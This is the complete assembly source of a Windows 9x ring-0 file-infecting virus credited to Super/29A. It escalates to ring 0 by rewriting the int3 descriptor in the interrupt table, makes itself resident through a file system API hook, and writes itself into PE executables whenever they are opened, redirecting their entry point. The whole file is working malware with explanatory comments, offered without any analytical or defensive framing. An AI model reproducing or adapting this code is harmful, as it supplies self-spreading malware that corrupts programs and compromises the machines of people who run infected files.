
;===================;
;    Sexy virus     ;
;===================;
; Made by Super/29A ;
;===================;

;===================================================================

 .386p
 locals
 jumps
 .model flat,STDCALL

L equ <LARGE>

;-------------------------------------------------------------------

VxDCall macro vxd_id,service_id
 int 20h
 dw service_id
 dw vxd_id
endm

VxDJmp macro vxd_id,service_id
 int 20h
 dw (8000h+service_id)
 dw vxd_id
endm

IFSMgr equ 0040h
GetHeap equ 000dh
InstallFileSystemAPIhook equ 0067h
Ring0_FileIO equ 0032h

;===================================================================
.data

 db 'This is my first ring0 virus. And its not the last!'

;===================================================================
.code

start:
;   int 3

   pushad ;save all regs
   call main

setup_ring0:
   fstp real8 ptr [edi-4]   ;restore int3 descriptor form copro stack
			    ; (and leave copro stack as before)
   xchg al,[edi] ; this byte should be zero (=reserved)
   scasb	 ; we change it to mark residency

   jz back_to_ring3 ;it's already resident

   push L 420h ;number of bytes to reserve from heap

   fld real8 ptr [esi] ;save instruction in copro stack
fix1:
   VxDCall IFSMgr,GetHeap ;allocate memory

   fst real8 ptr [esi] ;restore instruction from copro stack
		       ;value is *not* extracted from copro stack yet

   pop ecx ;ecx=420h
   xor si,si ;esi=host base address
   xor cl,cl ;ecx=400h
   xchg edi,eax ;edi=offset of reserved memory
   push edi
   rep movsb ;copy virus to memory

   lea eax,[edi-(end_code-API_hook)]
   push eax
   VxDCall IFSMgr,InstallFileSystemAPIhook ;install api hook

   xchg esi,eax ;esi contains the address of previous hook handler
   movsd ;save previous_hook

search_api_chain:
   lodsd ;get offset of previous hook info structure
	 ; this structure looks like this:
	 ;   +0=previous hook info structure (from down to top)
	 ;   +4=address of hook handler
	 ;   +8=next hook info structure (from top to down, that is, to the
	 ;	(one that was installed before)
   xchg esi,eax ;esi=next hook info structure
   add esi,8 ;esi=third dword in structure
   js search_api_chain

;eax=Should point after the hook info struc of default handler.
;    After this structure is a variable that contains the address
;    of the top hook info structure

   stosd ;save offset that holds top chain

   pop eax

   pop eax
   stosd ;save start of buffer in memory

   fstp real8 ptr [edi]       ;
   mov word ptr [edi+2],8032h ; create dinamic call
			      ; to call ifsmgr_ring0_fileio

back_to_ring3:
   iret ;bye bye, ring0


get_delta:
   pop esi
   lea edi,[esp+20h]
   movsd ;copy in stack the address of previous handler so as to return later

   cmp byte ptr [edi+08h],24h ; is this a file open?
   jnz exit ;nope, exit

   mov ebx,[edi+18h] ;get ioreq structure

   lodsd
   xchg edi,eax ;edi=holds top chain address
   xor eax,eax
   xchg eax,[edi] ;make top chain null, there will be no file monitor active
   pushad

   lodsd
   xchg edi,eax ;edi=start of buffer to read/write file
   push edi

   mov ebp,esi ;ebp="vxdjmp ifsmgr_ring0_fileio"

   mov esi,[ebx+2ch] ;esi=filename in unicode format

convert:
   movsb ;convert it to asciiz format
   dec edi
   cmpsb
   jnz convert

   pop esi

   xor eax,eax
   mov ah,0d5h ;r0_opencreatefile
   cdq
   inc edx ;if file exists, then open the file
   lea ebx,[edx+2-1] ;read/write access
   call ebp ;open file
   jb exit2

   xor ebx,ebx
   mov bh,0d6h ;r0_readfile
   xchg ebx,eax
   cdq ;edx=0=filepointer
   xor ecx,ecx
   mov ch,3 ;ecx=300h bytes to read

   pushad
   call ebp ;read from file
   cmp eax,ecx ;have we read 300h bytes?
   jnz test2 ;nope, exit
   mov ebx,[esi+3ch]
   cmp bh,ch ;PE header before 200h?
   jnb test1 ;nope, exit
   add ebx,esi
   cmp [ebx+55h],ch ;file header size less than 400h
   jna test1 ;yep, exit
   cmp word ptr [esi],'ZM'
   jnz test2
   xchg ecx,[ebx+28h]  ;set new entrypoint
test1:
   add al,(4+fix2-start)
   sub ecx,eax ;ecx=host entrypoint - 300h
   mov [ebp-(r0fio-fix2)],ecx
   jb test2
   cmp byte ptr [ebx],'P'
test2:
   popad
   jnz closefile ;error, exit

   mov ch,4  ;(ecx=400h)
   inc eax ;r0_writefile
   call ebp ;write header+virus = 400h bytes

closefile:
   mov ah,0d7h ;r0_closefile
   call ebp

exit2:
   popad
   stosd ;restore top api chain

exit:
   popad
_ret:
   ret ;jump to previous hook


main:
   mov ecx,cs
   pop eax ;eax=start of ring0 code
   xor cl,cl
   jecxz jump_host ;jump if winNT

   lea esi,[eax+(fix1-setup_ring0)] ;esi=instruction to patch

   push edi
   sidt fword ptr [esp-2]
   pop edi ;edi=start of IDT

   add edi,8*3h ;edi=int3 descriptor

   fld real8 ptr [edi] ;save in coprocessor stack this descriptor

   stosw	 ;
   scasw	 ;
   mov ah,0eeh	 ; create an intgate descriptor
   mov [edi],eax ;

   push ds
   push es
   int 3h   ;jump to ring-0 !
   pop es
   pop ds

jump_host:
   popad ;restore all regs

   db 0e9h ;jump to host entrypoint
fix2 dd (_ret-fix2-4)


db '[A92\repuS yb yxeS]'



API_hook:
   push eax ;reserve space in stack to copy the address to next handler
   pushad
   call get_delta

end_code:

vir_length equ ($-start)

old_API dd ?
api_chain dd ?
buffer_start dd ?

r0fio:
   VxDJmp IFSMgr,Ring0_FileIO


;-------------------------------------------------------------------


ends
end start
